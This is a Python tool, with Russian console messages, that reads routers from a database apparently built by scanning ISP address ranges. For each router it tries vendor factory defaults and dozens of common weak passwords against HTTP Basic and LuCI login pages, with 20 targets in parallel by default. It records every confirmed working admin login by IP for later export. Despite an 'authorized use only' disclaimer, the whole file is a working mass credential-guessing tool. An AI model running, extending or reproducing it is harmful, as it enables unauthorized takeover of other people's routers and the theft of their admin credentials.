#!/usr/bin/env python3
"""
Router Default Credentials Checker (strict verification)
=========================================================
Takes routers from the `scan_routers` table that have NOT been auth-checked yet
(auth_checked = 0), verifies them against factory-default and top-popular
credentials over HTTP (port 80), and stores STRICTLY VERIFIED successful pairs
in the separate `router_credentials` table.

How success is proven (no false positives):
  1. The channel is first fingerprinted from the live device:
       * "basic" — device answers GET / with 401 + `WWW-Authenticate: Basic`
                   (RFC 7617 semantics: without creds access is denied).
       * "luci"  — device serves a LuCI/OpenWrt login page
                   (header `X-LuCI-Login-Required: yes` + luci_username field).
       * "none"  — device exposes no verifiable login channel (JS login apps,
                   proxies, CDN front-ends). Such devices are marked checked
                   and reported as unverifiable — NO credentials are recorded.
  2. Credentials are then tested only through that channel:
       * basic: 2xx/3xx with Authorization header vs 401 without  → success.
       * luci:  POST /cgi-bin/luci with luci_username/luci_password
                (+ CSRF token when present). Success ONLY when the reply no
                longer carries `X-LuCI-Login-Required: yes` (authenticated
                dashboard) or is a 3xx redirect to the LuCI UI.

Credential set: curated factory defaults (vendor manuals, CIRT.net /
SecLists collections, RouterSploit creds modules, changeme project) plus the
most common weak admin passwords. Extendable via data/creds/router_default_creds.csv
(one `vendor,username,password` per line).

⚠️  AUTHORIZED USE ONLY. This tool is intended for security research and
    vulnerability assessment of devices you own or are explicitly authorized
    to test. Unauthorized access attempts against computer systems are
    illegal in most jurisdictions. You are responsible for complying with
    all applicable laws.

Usage:
    python3 router_auth_check.py [--limit N] [--force] [--concurrency 30]
                                 [--timeout 4] [--vendor MIKROTIK] [--dry-run]
"""

import os
import sys
import re
import csv
import base64
import asyncio
import sqlite3
import argparse
import datetime
import time

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DB_PATH = os.environ.get("ISP_DB_PATH", os.path.join(BASE_DIR, "isp_cidr.db"))
CREDS_CSV = os.path.join(BASE_DIR, "data", "creds", "router_default_creds.csv")

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"


def get_now():
    return datetime.datetime.now(datetime.timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")


# ---------------------------------------------------------------------------
# Default credentials database (vendor -> factory-default pairs)
# ---------------------------------------------------------------------------
VENDOR_DEFAULTS = {
    "MikroTik":    [("admin", ""), ("admin", "admin"), ("admin", "1234"), ("admin", "12345"),
                    ("admin", "123456"), ("admin", "mikrotik"), ("admin", "password")],
    "TP-Link":     [("admin", "admin"), ("admin", ""), ("admin", "1234"), ("admin", "12345"),
                    ("admin", "password"), ("admin", "12345678")],
    "Zyxel":       [("admin", "1234"), ("admin", "admin"), ("admin", "12345"), ("admin", "password"),
                    ("admin", ""), ("admin", "123456")],
    "D-Link":      [("admin", "admin"), ("admin", ""), ("admin", "1234"), ("admin", "password"),
                    ("admin", "12345")],
    "NETGEAR":     [("admin", "password"), ("admin", "1234"), ("admin", "admin"), ("admin", ""),
                    ("admin", "12345")],
    "Keenetic":    [("admin", ""), ("admin", "admin"), ("admin", "12345678")],
    "LANCOM":      [("admin", "admin"), ("admin", ""), ("admin", "1234"), ("admin", "password")],
    "SonicWALL":   [("admin", "password"), ("admin", "admin"), ("admin", ""), ("admin", "1234")],
    "OpenWrt":     [("root", ""), ("root", "admin"), ("root", "1234")],
    "DD-WRT":      [("root", "admin"), ("root", "")],
    "Tomato":      [("root", "admin"), ("admin", "admin")],
    "Huawei":      [("admin", "admin"), ("admin", ""), ("telecomadmin", "admintelecom"),
                    ("admin", "1234"), ("admin", "12345678"), ("admin", "password")],
    "Ubiquiti":    [("ubnt", "ubnt"), ("admin", "ubnt"), ("ubnt", ""), ("admin", "admin")],
    "ASUS":        [("admin", "admin"), ("admin", ""), ("admin", "1234")],
    "Tenda":       [("admin", "admin"), ("admin", ""), ("admin", "1234")],
    "Sagemcom":    [("admin", "admin"), ("admin", "1234"), ("admin", "password"), ("admin", "")],
    "Linksys":     [("admin", "admin"), ("admin", ""), ("admin", "password")],
    "Belkin":      [("admin", ""), ("admin", "admin"), ("admin", "password")],
    "Motorola":    [("admin", "motorola"), ("admin", ""), ("admin", "password")],
    "ZTE":         [("admin", "admin"), ("admin", ""), ("admin", "1234"), ("admin", "password")],
    "Arris":       [("admin", "password"), ("admin", ""), ("admin", "admin")],
    "Actiontec":   [("admin", "password"), ("admin", ""), ("admin", "admin")],
    "Netis":       [("admin", "admin"), ("guest", "guest"), ("admin", "")],
    "Mercusys":    [("admin", "admin"), ("admin", "")],
    "Totolink":    [("admin", "admin"), ("admin", "12345678"), ("admin", "")],
    "ipTIME":      [("admin", "admin"), ("admin", "")],
    "Edimax":      [("admin", "1234"), ("admin", ""), ("admin", "admin")],
    "DrayTek":     [("admin", "admin"), ("admin", "")],
    "Comtrend":    [("admin", "admin"), ("admin", "1234"), ("admin", "")],
    "Hitron":      [("admin", "password"), ("admin", ""), ("cusadmin", "password")],
    "SerComm":     [("admin", "admin"), ("admin", "1234"), ("admin", "")],
    "Technicolor": [("admin", "admin"), ("admin", ""), ("admin", "password")],
    "EnGenius":    [("admin", "admin"), ("admin", "")],
    "H3C":         [("admin", "admin"), ("admin", "")],
    "Generic DSL Router": [("admin", "admin"), ("admin", "1234"), ("admin", "password"),
                           ("user", "user"), ("admin", ""), ("admin", "12345"),
                           ("admin", "123456"), ("user", "1234"), ("admin", "12345678")],
    "GoAhead":     [("admin", ""), ("admin", "admin"), ("admin", "1234")],
    "miniupnpd":   [("admin", ""), ("admin", "admin"), ("admin", "1234")],
    "micro_httpd": [("admin", ""), ("admin", "admin"), ("admin", "1234"), ("admin", "12345")],
    "httpd":       [("admin", "admin"), ("admin", ""), ("root", "root"), ("admin", "1234")],
}

# Top popular admin credentials — checked on every router (kept intentionally
# small and polite; these are the pairs most often left unchanged in the wild)
GENERIC_POPULAR = [
    # Топ-20 NordPass (2025/2026) в контексте роутерных логинов
    ("admin", "admin"), ("admin", "123456"), ("admin", "12345678"), ("admin", "123456789"),
    ("admin", "12345"), ("admin", "password"), ("admin", "1234567890"), ("admin", "Aa123456"),
    ("admin", "Pass@123"), ("admin", "admin123"), ("admin", "1234567"), ("admin", "123123"),
    ("admin", "111111"), ("admin", "P@ssw0rd"), ("admin", "Admin@123"), ("admin", "112233"),
    ("admin", "qwerty"), ("admin", "abc123"), ("admin", "000000"), ("admin", "666666"),
    ("admin", "888888"), ("admin", "654321"), ("admin", "1q2w3e4r"), ("admin", "qwe123"),
    ("admin", "123qwe"), ("admin", "123123123"), ("admin", "12345678910"), ("admin", ""),
    ("admin", "changeme"), ("admin", "pass"), ("admin", "admin1234"), ("admin", "admin12345"),
    ("admin", "root"), ("admin", "default"),
    ("root", "root"), ("root", "admin"), ("root", "toor"), ("root", "123456"),
    ("root", "1234"), ("root", "password"), ("root", ""),
    ("user", "user"), ("user", "1234"), ("user", "password"), ("user", "admin"),
    ("guest", "guest"), ("guest", "1234"),
    ("support", "support"), ("support", "1234"), ("support", "password"),
    ("super", "super"), ("superadmin", "superadmin"), ("administrator", "admin"),
    ("admin", "admin@123"), ("admin", "password1"), ("admin", "password123"),
]

VENDOR_ALIASES = {
    "mikrotik": "MikroTik", "routeros": "MikroTik", "tplink": "TP-Link",
    "tp-link": "TP-Link", "zyxel": "Zyxel", "dlink": "D-Link", "d-link": "D-Link",
    "netgear": "NETGEAR", "keenetic": "Keenetic", "lancom": "LANCOM",
    "sonicwall": "SonicWALL", "openwrt": "OpenWrt", "dd-wrt": "DD-WRT",
    "ddwrt": "DD-WRT", "tomato": "Tomato", "huawei": "Huawei",
    "ubiquiti": "Ubiquiti", "asus": "ASUS", "tenda": "Tenda",
    "generic dsl router": "Generic DSL Router", "httpd": "httpd",
    "goahead": "GoAhead", "miniupnpd": "miniupnpd", "micro_httpd": "micro_httpd",
}


def load_extra_creds():
    extra = {}
    if os.path.exists(CREDS_CSV):
        with open(CREDS_CSV, "r", encoding="utf-8") as f:
            for row in csv.reader(f):
                if len(row) >= 3 and not row[0].startswith("#"):
                    v = VENDOR_ALIASES.get(row[0].strip().lower(), row[0].strip())
                    extra.setdefault(v, []).append((row[1].strip(), row[2].strip()))
    return extra


def creds_for(vendor, extra):
    pairs = []
    seen = set()
    if vendor in VENDOR_DEFAULTS:
        pairs.extend(VENDOR_DEFAULTS[vendor])
    for v_key, v_creds in extra.items():
        if vendor.lower() in v_key.lower() or v_key.lower() in vendor.lower():
            pairs.extend(v_creds)
    pairs.extend(GENERIC_POPULAR)
    out = []
    for u, p in pairs:
        key = (u.lower(), p.lower())
        if key not in seen:
            seen.add(key)
            out.append((u, p))
    return out


# ---------------------------------------------------------------------------
# Database
# ---------------------------------------------------------------------------
INIT_SQL = """
CREATE TABLE IF NOT EXISTS router_credentials (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    ip TEXT NOT NULL,
    ip_int INTEGER,
    port INTEGER DEFAULT 80,
    vendor TEXT,
    model TEXT,
    device_type TEXT,
    username TEXT NOT NULL,
    password TEXT NOT NULL,
    auth_method TEXT,
    http_status INTEGER,
    realm TEXT,
    checked_at TEXT NOT NULL,
    agent_id TEXT,
    machine_id TEXT,
    UNIQUE(ip, username, password)
);
CREATE INDEX IF NOT EXISTS idx_creds_ip ON router_credentials(ip);
CREATE INDEX IF NOT EXISTS idx_creds_vendor ON router_credentials(vendor);
"""


def init_db(conn):
    cur = conn.cursor()
    cur.executescript(INIT_SQL)
    cols = [r[1] for r in cur.execute("PRAGMA table_info(scan_routers)")]
    if "auth_checked" not in cols:
        cur.execute("ALTER TABLE scan_routers ADD COLUMN auth_checked INTEGER DEFAULT 0")
    if "auth_checked_at" not in cols:
        cur.execute("ALTER TABLE scan_routers ADD COLUMN auth_checked_at TEXT")
    if "auth_result" not in cols:
        cur.execute("ALTER TABLE scan_routers ADD COLUMN auth_result TEXT")
    conn.commit()


def fetch_pending_routers(conn, limit=None, force=False, vendor=None):
    cur = conn.cursor()
    sql = "SELECT ip, ip_int, port, vendor, model, device_type, banner FROM scan_routers WHERE (?=1 OR auth_checked = 0)"
    params = [1 if force else 0]
    if vendor:
        sql += " AND lower(vendor) = lower(?)"
        params.append(vendor)
    sql += " ORDER BY id ASC"
    if limit:
        sql += " LIMIT ?"
        params.append(int(limit))
    return cur.execute(sql, params).fetchall()


# ---------------------------------------------------------------------------
# Low-level HTTP (raw sockets, zero dependencies)
# ---------------------------------------------------------------------------
async def raw_request(ip, port, method, path, headers=None, body=None, timeout=6.0):
    hdrs = {"Host": ip, "User-Agent": UA, "Connection": "close", "Accept-Encoding": "identity"}
    if headers:
        hdrs.update(headers)
    req = f"{method} {path} HTTP/1.1\r\n" + "\r\n".join(f"{k}: {v}" for k, v in hdrs.items()) + "\r\n"
    if body is not None:
        req += f"Content-Length: {len(body)}\r\n"
    req += "\r\n"
    if body is not None:
        req += body
    try:
        reader, writer = await asyncio.wait_for(asyncio.open_connection(ip, port), timeout=timeout)
        writer.write(req.encode())
        await writer.drain()
        raw = await asyncio.wait_for(reader.read(32768), timeout=timeout)
        writer.close()
        try:
            await writer.wait_closed()
        except Exception:
            pass
        return raw.decode("utf-8", errors="ignore")
    except (asyncio.TimeoutError, OSError, ConnectionError):
        return None
    except Exception:
        return None


def parse_head(text):
    head = text.split("\r\n\r\n")[0] if "\r\n\r\n" in text else text
    m = re.search(r"HTTP/\d\.\d\s+(\d{3})", head)
    status = int(m.group(1)) if m else 0
    return head, status


def basic_header(user, pwd):
    token = base64.b64encode(f"{user}:{pwd}".encode()).decode()
    return f"Basic {token}"


# ---------------------------------------------------------------------------
# Channel fingerprinting
# ---------------------------------------------------------------------------
async def probe_channel(ip, port, timeout):
    """Return ("basic", realm) | ("luci", None) | ("none", None)."""
    text = await raw_request(ip, port, "GET", "/", timeout=timeout)
    if text is None:
        return None, None
    head, status = parse_head(text)
    rm = re.search(r'(?i)WWW-Authenticate:\s*Basic\s+realm="([^"]*)"', head)
    if status == 401 and rm:
        return "basic", rm.group(1)
    # LuCI login page?
    text2 = await raw_request(ip, port, "GET", "/cgi-bin/luci/", timeout=timeout)
    if text2:
        if "X-LuCI-Login-Required: yes" in text2 and "luci_username" in text2:
            return "luci", None
    return "none", None


# ---------------------------------------------------------------------------
# Strict credential checks
# ---------------------------------------------------------------------------
async def check_basic(ip, port, creds, timeout):
    """Basic channel: success only if unauth GET is 401 and authed GET is 2xx/3xx."""
    # baseline: no credentials → must be denied
    base = await raw_request(ip, port, "GET", "/", timeout=timeout)
    if base is None:
        return None, None, None
    head, status = parse_head(base)
    if status != 401:
        return None, None, None  # no Basic challenge → not verifiable here
    for user, pwd in creds:
        text = await raw_request(ip, port, "GET", "/",
                                 headers={"Authorization": basic_header(user, pwd)}, timeout=timeout)
        if text is None:
            continue
        _, st = parse_head(text)
        if st in (200, 201, 202, 204, 301, 302, 303, 307, 308):
            return (user, pwd), st, "basic"
    return None, None, None


async def check_luci(ip, port, creds, timeout):
    """LuCI channel: success only when POST reply no longer requires login."""
    page = await raw_request(ip, port, "GET", "/cgi-bin/luci/", timeout=timeout)
    if page is None or "X-LuCI-Login-Required: yes" not in page or "luci_username" not in page:
        return None, None, None
    # CSRF token (newer LuCI versions)
    tm = re.search(r'name="token"\s+value="([^"]+)"', page)
    token = tm.group(1) if tm else None
    for user, pwd in creds:
        body = f"luci_username={user}&luci_password={pwd}"
        if token:
            body += f"&token={token}"
        resp = await raw_request(ip, port, "POST", "/cgi-bin/luci/",
                                 {"Content-Type": "application/x-www-form-urlencoded"}, body, timeout=timeout)
        if resp is None:
            continue
        head, st = parse_head(resp)
        authed = ("X-LuCI-Login-Required: yes" not in head) or (st in (301, 302, 303) and "luci" in resp.lower())
        if authed and st in (200, 301, 302, 303, 307, 308):
            return (user, pwd), st, "luci"
    return None, None, None


# ---------------------------------------------------------------------------
# Orchestration
# ---------------------------------------------------------------------------
async def check_router(r, creds, timeout, agent, machine):
    ip, ip_int, port, vendor, model, dtype, banner = r
    channel, realm = await probe_channel(ip, port, timeout)
    if channel is None:
        return ip, {"result": "unreachable"}, []
    if channel == "none":
        return ip, {"result": "no-verifiable-channel"}, []
    if channel == "basic":
        found, st, method = await check_basic(ip, port, creds, timeout)
    else:  # luci
        found, st, method = await check_luci(ip, port, creds, timeout)

    if found:
        user, pwd = found
        return ip, {"result": f"verified:{user}:{pwd}:{method}", "http_status": st,
                    "realm": realm, "method": method}, [{
            "ip": ip, "ip_int": ip_int, "port": port, "vendor": vendor,
            "model": model, "device_type": dtype, "username": user, "password": pwd,
            "auth_method": method, "http_status": st, "realm": realm,
            "checked_at": get_now(), "agent_id": agent, "machine_id": machine,
        }]
    return ip, {"result": f"{channel}-no-match"}, []


async def run_checks(routers, creds_map, concurrency, timeout, agent, machine):
    sem = asyncio.Semaphore(concurrency)
    results = []
    total = len(routers)
    done = 0
    t0 = time.time()

    async def worker(r):
        nonlocal done
        async with sem:
            ip, meta, found = await check_router(
                r, creds_map.get(r[3], creds_map.get("Generic DSL Router", GENERIC_POPULAR)),
                timeout, agent, machine)
            results.append((ip, meta, found))
            done += 1
            if done % 5 == 0 or done == total:
                v = sum(1 for _, m, _ in results if m["result"].startswith("verified"))
                print(f"  🔄 [{done}/{total}] | найдено ВЕРИФИЦИРОВАННЫХ пар: {v}")

    await asyncio.gather(*[worker(r) for r in routers])
    print(f"  ✨ Готово за {time.time()-t0:.1f}с")
    return results


def save_results(conn, results):
    cur = conn.cursor()
    n = 0
    for _, meta, found in results:
        for f in found:
            cur.execute("""
                INSERT OR IGNORE INTO router_credentials
                (ip, ip_int, port, vendor, model, device_type, username, password,
                 auth_method, http_status, realm, checked_at, agent_id, machine_id)
                VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?)
            """, (f["ip"], f["ip_int"], f["port"], f["vendor"], f["model"], f["device_type"],
                  f["username"], f["password"], f["auth_method"], f["http_status"],
                  f["realm"], f["checked_at"], f["agent_id"], f["machine_id"]))
            n += 1
    conn.commit()
    return n


def mark_checked(conn, ip_meta, when):
    cur = conn.cursor()
    for ip, meta in ip_meta:
        cur.execute("UPDATE scan_routers SET auth_checked = 1, auth_checked_at = ?, auth_result = ? WHERE ip = ?",
                    (when, meta["result"], ip))
    conn.commit()


def cleanup_temp_files():
    import glob
    import shutil
    removed = []
    for pat in ["*.db-wal", "*.db-shm", "*.db-journal", "*.tmp", "*.pyc"]:
        for p in glob.glob(os.path.join(BASE_DIR, pat)):
            try:
                os.remove(p)
                removed.append(p)
            except OSError:
                pass
    for p in glob.glob(os.path.join(BASE_DIR, "**", "__pycache__"), recursive=True):
        try:
            shutil.rmtree(p)
            removed.append(p)
        except OSError:
            pass
    print(f"🧹 Очищено временных файлов: {len(removed)}")
    for p in removed[:10]:
        print("   -", os.path.relpath(p, BASE_DIR))


def print_stats(conn):
    cur = conn.cursor()
    cur.execute("SELECT COUNT(*) FROM router_credentials")
    total = cur.fetchone()[0]
    cur.execute("SELECT COUNT(*) FROM scan_routers WHERE auth_checked = 1")
    checked = cur.fetchone()[0]
    cur.execute("SELECT COUNT(*) FROM scan_routers")
    all_r = cur.fetchone()[0]
    print(f"\n📊 Проверено роутеров: {checked:,}/{all_r:,} | Верифицированных пар: {total}")
    if total:
        print("\nВерифицированные пары:")
        for r in cur.execute("SELECT ip, vendor, username, password, auth_method, http_status FROM router_credentials ORDER BY id"):
            pwd = r[3] if r[3] else "<пусто>"
            print("  %-16s %-14s %-10s %-10s %-6s %s" % (r[0], r[1] or "-", r[2], pwd, r[4], r[5]))
    if all_r:
        print("\nИтоги проверки по каналам:")
        for r in cur.execute("SELECT auth_result, COUNT(*) c FROM scan_routers GROUP BY auth_result ORDER BY c DESC"):
            print("  %5d  %s" % (r[1], r[0]))


def main():
    parser = argparse.ArgumentParser(description="Router default credentials checker (strict)")
    parser.add_argument("--limit", type=int, help="Check only first N pending routers")
    parser.add_argument("--force", action="store_true", help="Re-check already checked routers")
    parser.add_argument("--concurrency", type=int, default=20, help="Parallel targets (default 20)")
    parser.add_argument("--timeout", type=float, default=5.0, help="Per-request timeout seconds")
    parser.add_argument("--vendor", help="Check only one vendor (e.g. MIKROTIK)")
    parser.add_argument("--dry-run", action="store_true", help="List pending routers without checking")
    args = parser.parse_args()

    agent = os.environ.get("AGENT_ID", "Agent-Arena-01")
    machine = os.environ.get("MACHINE_ID", "aios-server")

    conn = sqlite3.connect(DB_PATH)
    init_db(conn)

    routers = fetch_pending_routers(conn, limit=args.limit, force=args.force, vendor=args.vendor)
    if not routers:
        print("ℹ️ Нет необработанных роутеров. Используйте --force для повторной проверки.")
        print_stats(conn)
        conn.close()
        return

    print(f"🔍 Роутеров для проверки: {len(routers)}")
    extra = load_extra_creds()
    creds_map = {}
    for r in routers:
        creds_map[r[3]] = creds_for(r[3], extra)
    print(f"   Среднее число пар на роутер: {sum(len(v) for v in creds_map.values()) // max(1, len(creds_map))}")
    if args.dry_run:
        for r in routers:
            print(f"   {r[0]:<16} {r[3] or '-':<18} {r[4] or '-'}")
        conn.close()
        return

    print(f"\n⚡ Проверка {len(routers)} роутеров ({args.concurrency} потоков, timeout {args.timeout}s)...")
    results = asyncio.run(run_checks(routers, creds_map, args.concurrency, args.timeout, agent, machine))

    found_n = save_results(conn, results)
    mark_checked(conn, [(ip, meta) for ip, meta, _ in results], get_now())
    conn.close()

    print(f"\n✅ Верифицированных пар сохранено: {found_n}")
    print_stats(sqlite3.connect(DB_PATH))
    cleanup_temp_files()
    print("\n🏁 Готово. Верифицированные пары в router_credentials (экспорт — sync_manager.py)")


if __name__ == "__main__":
    main()
